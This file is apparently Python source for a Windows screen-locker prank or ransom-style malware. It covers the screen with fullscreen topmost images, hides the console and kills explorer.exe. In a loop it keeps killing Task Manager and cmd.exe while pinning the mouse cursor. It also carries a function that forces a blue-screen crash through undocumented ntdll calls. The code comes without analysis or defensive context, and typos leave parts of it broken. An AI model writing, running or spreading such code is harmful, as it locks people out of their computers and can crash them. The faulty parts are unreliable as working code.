try:
	from tkinter import *
	from tkinter import messagebox
	import pyautogui, sys
	from PIL import ImageTk,Image
	import ctypes
	import os
	root = Tk()
	status = False
	counter = 0



	filename = PhotoImage(file = "img\\ss_ru.png")
	p2 = PhotoImage(file = "img\\p2.png")
	p2_ru = PhotoImage(file = "img\\p2_ru.png")
	filename2 = PhotoImage(file = "img\\ss.png")

	background_label = Label(root, image=filename)
	background_label.place(x=0, y=0, relwidth=1, relheight=1)
	background_label.pack()
	root.after_idle(root.attributes,'-topmost',True)

	def delete(x):
		os.system("taskkill /F /IM python.exe")
		os.system("taskkill /F /IM main.exe")
		time.sleep(2)
		os.system("explorer.exe")
		os.sytem("notepad test.txt")
	def block(): 
		pyautogui.moveTo(x=680,y=800)
		root.protocol("WM_DELETE_WINDOW",block)
		root.update()
	block()
	root.attributes('-fullscreen', True)
	root.config(cursor="none")
	def bsod(x):
		ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
		ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
	def change_image(x):
		global status
		global background_label
		if status == True:
			if counter == 0:
				background_label.config(image=filename)
			if counter == 1:
				background_label.config(image=p2_ru)
			status = False
		elif status == False:
			if counter == 0:
				background_label.config(image=filename2)
			if counter == 1:
				background_label.config(image=p2)
			status = True
	def nextpage(x):
		global counter
		if counter == 0:
			if status == True:
				background_label.config(image=p2)
			if status == False:
				background_label.config(image=p2_ru)
		counter += 1


	root.bind('<F1>', change_image)
	root.bind('<Tab>', nextpage)
	root.bind('<Delete>', delete)
	pyautogui.FAILSAFE = False
	os.system("taskkill /F /IM explorer.exe")
	ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
	while True:
		pyautogui.moveTo(0, 0)
		os.system("taskkill /F /IM taskmgr.exe")
		os.system("taskkill /F /IM cmd.exe")
		root.update()
except:
	pass